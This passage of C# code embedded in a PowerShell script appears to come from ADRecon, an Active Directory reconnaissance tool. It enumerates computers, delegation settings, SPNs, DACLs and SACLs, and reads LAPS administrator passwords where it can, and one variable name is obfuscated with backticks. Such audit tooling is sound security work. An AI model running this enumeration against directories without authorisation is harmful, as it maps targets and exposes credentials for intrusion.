                        if (Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 2)))
                        {
                            Enforced = true;
                        }
                        else
                        {
                            Enforced = false;
                        }
                        GPOName = ADWSClass.AdGPODictionary.ContainsKey(linksplit[2].ToUpper()) ? ADWSClass.AdGPODictionary[linksplit[2].ToUpper()] : linksplit[2].Split('=',',')[1];
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Members["Name"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Members["DistinguishedName"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", Order));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", AdSOM.Members["gPOptions"].Value));
                        SOMsList.Add( SOMObj );
                        Order--;
                    }
                    return SOMsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class PrinterRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdPrinter = (PSObject) record;

                    PSObject PrinterObj = new PSObject();
                    PrinterObj.Members.Add(new PSNoteProperty("Name", AdPrinter.Members["Name"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("ServerName", AdPrinter.Members["serverName"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("ShareName", ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members["printShareName"].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverName", AdPrinter.Members["driverName"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverVersion", AdPrinter.Members["driverVersion"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("PortName", ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members["portName"].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty("URL", ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members["url"].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty("whenCreated", AdPrinter.Members["whenCreated"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("whenChanged", AdPrinter.Members["whenChanged"].Value));
                    return new PSObject[] { PrinterObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    bool Dormant = false;
                    bool PasswordNotChangedafterMaxAge = false;
                    string SIDHistory = "";
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;

                    if (AdComputer.Members["LastLogonDate"].Value != null)
                    {
                        //LastLogonDate = DateTime.FromFileTime((long)(AdComputer.Members["lastLogonTimeStamp"].Value));
                        // LastLogonDate is lastLogonTimeStamp converted to local time
                        LastLogonDate = Convert.ToDateTime(AdComputer.Members["LastLogonDate"].Value);
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    if (AdComputer.Members["PasswordLastSet"].Value != null)
                    {
                        //PasswordLastSet = DateTime.FromFileTime((long)(AdComputer.Members["pwdLastSet"].Value));
                        // PasswordLastSet is pwdLastSet converted to local time
                        PasswordLastSet = Convert.ToDateTime(AdComputer.Members["PasswordLastSet"].Value);
                        DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    if ( ((bool) AdComputer.Members["TrustedForDelegation"].Value) && ((int) AdComputer.Members["primaryGroupID"].Value == 515) )
                    {
                        DelegationType = "Unconstrained";
                        DelegationServices = "Any";
                    }
                    if (AdComputer.Members["msDS-AllowedToDelegateTo"] != null)
                    {
                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection delegateto = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdComputer.Members["msDS-AllowedToDelegateTo"].Value;
                        if (delegateto.Value != null)
                        {
                            DelegationType = "Constrained";
                            foreach (var value in delegateto)
                            {
                                DelegationServices = DelegationServices + "," + Convert.ToString(value);
                            }
                            DelegationServices = DelegationServices.TrimStart(',');
                        }
                    }
                    if ((bool) AdComputer.Members["TrustedToAuthForDelegation"].Value)
                    {
                        DelegationProtocol = "Any";
                    }
                    else if (DelegationType != null)
                    {
                        DelegationProtocol = "Kerberos";
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdComputer.Members["SIDHistory"].Value;
                    string sids = "";
                    foreach (var value in history)
                    {
                        sids = sids + "," + Convert.ToString(value);
                    }
                    SIDHistory = sids.TrimStart(',');
                    string OperatingSystem = CleanString((AdComputer.Members["OperatingSystem"].Value != null ? AdComputer.Members["OperatingSystem"].Value : "-") + " " + AdComputer.Members["OperatingSystemHotfix"].Value + " " + AdComputer.Members["OperatingSystemServicePack"].Value + " " + AdComputer.Members["OperatingSystemVersion"].Value);

                    PSObject ComputerObj = new PSObject();
                    ComputerObj.Members.Add(new PSNoteProperty("UserName", CleanString(AdComputer.Members["SamAccountName"].Value)));
                    ComputerObj.Members.Add(new PSNoteProperty("Name", CleanString(AdComputer.Members["Name"].Value)));
                    ComputerObj.Members.Add(new PSNoteProperty("DNSHostName", AdComputer.Members["DNSHostName"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Enabled", AdComputer.Members["Enabled"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("IPv4Address", AdComputer.Members["IPv4Address"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Operating System", OperatingSystem));
                    ComputerObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    ComputerObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    ComputerObj.Members.Add(new PSNoteProperty("Primary Group ID", AdComputer.Members["primaryGroupID"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("SID", AdComputer.Members["SID"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    ComputerObj.Members.Add(new PSNoteProperty("Description", CleanString(AdComputer.Members["Description"].Value)));
                    ComputerObj.Members.Add(new PSNoteProperty("ms-ds-CreatorSid", AdComputer.Members["ms-ds-CreatorSid"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    ComputerObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    ComputerObj.Members.Add(new PSNoteProperty("UserAccountControl", AdComputer.Members["UserAccountControl"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("whenCreated", AdComputer.Members["whenCreated"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("whenChanged", AdComputer.Members["whenChanged"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Distinguished Name", AdComputer.Members["DistinguishedName"].Value));
                    return new PSObject[] { ComputerObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection SPNs = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdComputer.Members["servicePrincipalName"].Value;
                    if (SPNs.Value == null)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();

                    foreach (string SPN in SPNs)
                    {
                        bool flag = true;
                        string[] SPNArray = SPN.Split('/');
                        foreach (PSObject Obj in SPNList)
                        {
                            if ( (string) Obj.Members["Service"].Value == SPNArray[0] )
                            {
                                Obj.Members["Host"].Value = string.Join(",", (Obj.Members["Host"].Value + "," + SPNArray[1]).Split(',').Distinct().ToArray());
                                flag = false;
                            }
                        }
                        if (flag)
                        {
                            PSObject ComputerSPNObj = new PSObject();
                            ComputerSPNObj.Members.Add(new PSNoteProperty("UserName", CleanString(AdComputer.Members["SamAccountName"].Value)));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Name", CleanString(AdComputer.Members["Name"].Value)));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                            SPNList.Add( ComputerSPNObj );
                        }
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class LAPSRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    bool PasswordStored = false;
                    DateTime? CurrentExpiration = null;
                    try
                    {
                        CurrentExpiration = DateTime.FromFileTime((long)(AdComputer.Members["ms-Mcs-AdmPwdExpirationTime"].Value));
                        PasswordStored = true;
                    }
                    catch //(Exception e)
                    {
                        //Console.WriteLine("Exception caught: {0}", e);
                    }
                    PSObject LAPSObj = new PSObject();
                    LAPSObj.Members.Add(new PSNoteProperty("Hostname", (AdComputer.Members["DNSHostName"].Value != null ? AdComputer.Members["DNSHostName"].Value : AdComputer.Members["CN"].Value )));
                    LAPSObj.Members.Add(new PSNoteProperty("Stored", PasswordStored));
                    LAPSObj.Members.Add(new PSNoteProperty("Readable", (AdComputer.Members["ms-Mcs-AdmPwd"].Value != null ? true : false)));
                    LAPSObj.Members.Add(new PSNoteProperty("Password", AdComputer.Members["ms-Mcs-AdmPwd"].Value));
                    LAPSObj.Members.Add(new PSNoteProperty("Expiration", CurrentExpiration));
                    return new PSObject[] { LAPSObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class SIDRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    switch (Convert.ToString(AdObject.Members["ObjectClass"].Value))
                    {
                        case "user":
                        case "computer":
                        case "group":
                            ADWSClass.AdSIDDictionary.Add(Convert.ToString(AdObject.Members["objectsid"].Value), Convert.ToString(AdObject.Members["Name"].Value));
                            break;
                    }
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class DACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    string Name = null;
                    string Type = null;
                    List<PSObject> DACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Members["Name"].Value);

                    switch (Convert.ToString(AdObject.Members["objectClass"].Value))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Members["DisplayName"].Value);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Members["objectClass"].Value);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Members["ntsecuritydescriptor"] != null)
                    {
                        DirectoryObjectSecurity DirObjSec = (DirectoryObjectSecurity) AdObject.Members["ntsecuritydescriptor"].Value;
                        AuthorizationRuleCollection AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAccessRule Rule in AccessRules)
                        {
                            string IdentityReference = Convert.ToString(Rule.IdentityReference);
                            string Owner = Convert.ToString(DirObjSec.GetOwner(typeof(System.Security.Principal.SecurityIdentifier)));
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("AccessControlType", Rule.AccessControlType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReferenceName", ADWSClass.AdSIDDictionary.ContainsKey(IdentityReference) ? ADWSClass.AdSIDDictionary[IdentityReference] : IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("OwnerName", ADWSClass.AdSIDDictionary.ContainsKey(Owner) ? ADWSClass.AdSIDDictionary[Owner] : Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("Owner", Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("DistinguishedName", AdObject.Members["DistinguishedName"].Value));
                            DACLList.Add( ObjectObj );
                        }
                    }

                    return DACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

    class SACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    string Name = null;
                    string Type = null;
                    List<PSObject> SACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Members["Name"].Value);

                    switch (Convert.ToString(AdObject.Members["objectClass"].Value))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Members["DisplayName"].Value);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Members["objectClass"].Value);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Members["ntsecuritydescriptor"] != null)
                    {
                        DirectoryObjectSecurity DirObjSec = (DirectoryObjectSecurity) AdObject.Members["ntsecuritydescriptor"].Value;
                        AuthorizationRuleCollection AuditRules = (AuthorizationRuleCollection) DirObjSec.GetAuditRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAuditRule Rule in AuditRules)
                        {
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("AuditFlags", Rule.AuditFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            SACLList.Add( ObjectObj );
                        }
                    }

                    return SACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        //The interface and implmentation class used to handle the results (this implementation just writes the strings to a file)

        interface IResultsHandler
        {
            void processResults(Object[] t);

            Object[] finalise();
        }

        class SimpleResultsHandler : IResultsHandler
        {
            private Object lockObj = new Object();
            private List<Object> processed = new List<Object>();

            public SimpleResultsHandler()
            {
            }

            public void processResults(Object[] results)
            {
                lock (lockObj)
                {
                    if (results.Length != 0)
                    {
                        for (var i = 0; i < results.Length; i++)
                        {
                            processed.Add((PSObject)results[i]);
                        }
                    }
                }
            }

            public Object[] finalise()
            {
                return processed.ToArray();
            }
        }
"@

${LDa`PSO`UrcE} = @"
// Thanks Dennis Albuquerque for the C# multithreading code
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Xml;
using System.Net;
using System.Threading;
using System.DirectoryServices;
using System.Security.Principal;
using System.Security.AccessControl;
using System.Management.Automation;

using System.Diagnostics;
//using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Runtime.InteropServices;

namespace ADRecon
{
    public static class LDAPClass
    {
        private static DateTime Date1;
        private static int PassMaxAge;
        private static int DormantTimeSpan;
        private static Dictionary<string, string> AdGroupDictionary = new Dictionary<string, string>();
        private static string DomainSID;
        private static Dictionary<string, string> AdGPODictionary = new Dictionary<string, string>();
        private static Hashtable GUIDs = new Hashtable();
        private static Dictionary<string, string> AdSIDDictionary = new Dictionary<string, string>();
        private static readonly HashSet<string> Groups = new HashSet<string> ( new string[] {"268435456", "268435457", "536870912", "536870913"} );
        private static readonly HashSet<string> Users = new HashSet<string> ( new string[] { "805306368" } );
        private static readonly HashSet<string> Computers = new HashSet<string> ( new string[] { "805306369" }) ;
        private static readonly HashSet<string> TrustAccounts = new HashSet<string> ( new string[] { "805306370" } );

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum UACFlags
        {
            SCRIPT = 1,        // 0x1
            ACCOUNTDISABLE = 2,        // 0x2
            HOMEDIR_REQUIRED = 8,        // 0x8
            LOCKOUT = 16,       // 0x10
            PASSWD_NOTREQD = 32,       // 0x20
            PASSWD_CANT_CHANGE = 64,       // 0x40
            ENCRYPTED_TEXT_PASSWORD_ALLOWED = 128,      // 0x80
            TEMP_DUPLICATE_ACCOUNT = 256,      // 0x100
            NORMAL_ACCOUNT = 512,      // 0x200
            INTERDOMAIN_TRUST_ACCOUNT = 2048,     // 0x800
            WORKSTATION_TRUST_ACCOUNT = 4096,     // 0x1000
            SERVER_TRUST_ACCOUNT = 8192,     // 0x2000
            DONT_EXPIRE_PASSWD = 65536,    // 0x10000
            MNS_LOGON_ACCOUNT = 131072,   // 0x20000
            SMARTCARD_REQUIRED = 262144,   // 0x40000
            TRUSTED_FOR_DELEGATION = 524288,   // 0x80000
            NOT_DELEGATED = 1048576,  // 0x100000
            USE_DES_KEY_ONLY = 2097152,  // 0x200000
            DONT_REQUIRE_PREAUTH = 4194304,  // 0x400000
            PASSWORD_EXPIRED = 8388608,  // 0x800000
            TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 16777216, // 0x1000000
            PARTIAL_SECRETS_ACCOUNT = 67108864 // 0x04000000
        }

        [Flags]
        //Values taken from https://blogs.msdn.microsoft.com/openspecification/2011/05/30/windows-configurations-for-kerberos-supported-encryption-type/
        public enum KerbEncFlags
        {
            ZERO = 0,
            DES_CBC_CRC = 1,        // 0x1
            DES_CBC_MD5 = 2,        // 0x2
            RC4_HMAC = 4,        // 0x4
            AES128_CTS_HMAC_SHA1_96 = 8,       // 0x18
            AES256_CTS_HMAC_SHA1_96 = 16       // 0x10
        }

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum GroupTypeFlags
        {
            GLOBAL_GROUP       = 2,            // 0x00000002
            DOMAIN_LOCAL_GROUP = 4,            // 0x00000004
            LOCAL_GROUP        = 4,            // 0x00000004
            UNIVERSAL_GROUP    = 8,            // 0x00000008
            SECURITY_ENABLED   = -2147483648   // 0x80000000
        }

		private static readonly Dictionary<string, string> Replacements = new Dictionary<string, string>()
        {
            //{System.Environment.NewLine, ""},
            //{",", ";"},
            {"\"", "'"}
        };

        public static string CleanString(Object StringtoClean)
        {
            // Remove extra spaces and new lines
            string CleanedString = string.Join(" ", ((Convert.ToString(StringtoClean)).Split((string[]) null, StringSplitOptions.RemoveEmptyEntries)));
            foreach (string Replacement in Replacements.Keys)
            {
                CleanedString = CleanedString.Replace(Replacement, Replacements[Replacement]);
            }
            return CleanedString;
        }

        public static int ObjectCount(Object[] ADRObject)
        {
            return ADRObject.Length;
        }

        public static bool LAPSCheck(Object[] AdComputers)
        {
            bool LAPS = false;
            foreach (SearchResult AdComputer in AdComputers)
            {
                if (AdComputer.Properties["ms-mcs-admpwdexpirationtime"].Count == 1)
                {
                    LAPS = true;
                    return LAPS;
                }
            }
            return LAPS;
        }

        public static Object[] DomainControllerParser(Object[] AdDomainControllers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdDomainControllers, numOfThreads, "DomainControllers");
            return ADRObj;
        }

        public static Object[] SchemaParser(Object[] AdSchemas, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdSchemas, numOfThreads, "SchemaHistory");
            return ADRObj;
        }

        public static Object[] UserParser(Object[] AdUsers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
            LDAPClass.DormantTimeSpan = DormantTimeSpan;
            LDAPClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "Users");
            return ADRObj;
        }

        public static Object[] UserSPNParser(Object[] AdUsers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "UserSPNs");
            return ADRObj;
        }

        public static Object[] GroupParser(Object[] AdGroups, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "Groups");
            return ADRObj;
        }

        public static Object[] GroupChangeParser(Object[] AdGroups, DateTime Date1, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "GroupChanges");
            return ADRObj;
        }

        public static Object[] GroupMemberParser(Object[] AdGroups, Object[] AdGroupMembers, string DomainSID, int numOfThreads)
        {
            LDAPClass.AdGroupDictionary = new Dictionary<string, string>();
            runProcessor(AdGroups, numOfThreads, "GroupsDictionary");
            LDAPClass.DomainSID = DomainSID;
            Object[] ADRObj = runProcessor(AdGroupMembers, numOfThreads, "GroupMembers");
            return ADRObj;
        }

        public static Object[] OUParser(Object[] AdOUs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdOUs, numOfThreads, "OUs");
            return ADRObj;
        }

        public static Object[] GPOParser(Object[] AdGPOs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGPOs, numOfThreads, "GPOs");
            return ADRObj;
        }

        public static Object[] SOMParser(Object[] AdGPOs, Object[] AdSOMs, int numOfThreads)
        {
            LDAPClass.AdGPODictionary = new Dictionary<string, string>();
            runProcessor(AdGPOs, numOfThreads, "GPOsDictionary");
            Object[] ADRObj = runProcessor(AdSOMs, numOfThreads, "SOMs");
            return ADRObj;
        }

        public static Object[] PrinterParser(Object[] ADPrinters, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(ADPrinters, numOfThreads, "Printers");
            return ADRObj;
        }

        public static Object[] ComputerParser(Object[] AdComputers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
            LDAPClass.DormantTimeSpan = DormantTimeSpan;
            LDAPClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "Computers");
            return ADRObj;
        }

        public static Object[] ComputerSPNParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "ComputerSPNs");
            return ADRObj;
        }

        public static Object[] LAPSParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "LAPS");
            return ADRObj;
        }

        public static Object[] DACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            LDAPClass.AdSIDDictionary = new Dictionary<string, string>();
            runProcessor(ADObjects, numOfThreads, "SIDDictionary");
            LDAPClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "DACLs");
            return ADRObj;
        }

        public static Object[] SACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            LDAPClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "SACLs");
            return ADRObj;
        }

        static Object[] runProcessor(Object[] arrayToProcess, int numOfThreads, string processorType)
        {
            int totalRecords = arrayToProcess.Length;
            IRecordProcessor recordProcessor = recordProcessorFactory(processorType);
            IResultsHandler resultsHandler = new SimpleResultsHandler ();
            int numberOfRecordsPerThread = totalRecords / numOfThreads;
            int remainders = totalRecords % numOfThreads;

            Thread[] threads = new Thread[numOfThreads];
            for (int i = 0; i < numOfThreads; i++)
            {
                int numberOfRecordsToProcess = numberOfRecordsPerThread;
                if (i == (numOfThreads - 1))
                {
                    //last thread, do the remaining records
                    numberOfRecordsToProcess += remainders;
                }

                //split the full array into chunks to be given to different threads
                Object[] sliceToProcess = new Object[numberOfRecordsToProcess];
                Array.Copy(arrayToProcess, i * numberOfRecordsPerThread, sliceToProcess, 0, numberOfRecordsToProcess);
                ProcessorThread processorThread = new ProcessorThread(i, recordProcessor, resultsHandler, sliceToProcess);
                threads[i] = new Thread(processorThread.processThreadRecords);
                threads[i].Start();
            }
            foreach (Thread t in threads)
            {
                t.Join();
            }

            return resultsHandler.finalise();
        }

        static IRecordProcessor recordProcessorFactory(string name)
        {
            switch (name)
            {
                case "DomainControllers":
                    return new DomainControllerRecordProcessor();
                case "SchemaHistory":
                    return new SchemaRecordProcessor();
                case "Users":
                    return new UserRecordProcessor();
                case "UserSPNs":
                    return new UserSPNRecordProcessor();
                case "Groups":
                    return new GroupRecordProcessor();
                case "GroupChanges":
                    return new GroupChangeRecordProcessor();
                case "GroupsDictionary":
                    return new GroupRecordDictionaryProcessor();
                case "GroupMembers":
                    return new GroupMemberRecordProcessor();
                case "OUs":
                    return new OURecordProcessor();
                case "GPOs":
                    return new GPORecordProcessor();
                case "GPOsDictionary":
                    return new GPORecordDictionaryProcessor();
                case "SOMs":
                    return new SOMRecordProcessor();
                case "Printers":
                    return new PrinterRecordProcessor();
                case "Computers":
                    return new ComputerRecordProcessor();
                case "ComputerSPNs":
                    return new ComputerSPNRecordProcessor();
                case "LAPS":
                    return new LAPSRecordProcessor();
                case "SIDDictionary":
                    return new SIDRecordDictionaryProcessor();
                case "DACLs":
                    return new DACLRecordProcessor();
                case "SACLs":
                    return new SACLRecordProcessor();
            }
            throw new ArgumentException("Invalid processor type " + name);
        }

        class ProcessorThread
        {
            readonly int id;
            readonly IRecordProcessor recordProcessor;
            readonly IResultsHandler resultsHandler;
            readonly Object[] objectsToBeProcessed;

            public ProcessorThread(int id, IRecordProcessor recordProcessor, IResultsHandler resultsHandler, Object[] objectsToBeProcessed)
            {
                this.recordProcessor = recordProcessor;
                this.id = id;
                this.resultsHandler = resultsHandler;
                this.objectsToBeProcessed = objectsToBeProcessed;
            }

            public void processThreadRecords()
            {
                for (int i = 0; i < objectsToBeProcessed.Length; i++)
                {
                    Object[] result = recordProcessor.processRecord(objectsToBeProcessed[i]);
                    resultsHandler.processResults(result); //this is a thread safe operation
                }
            }
        }

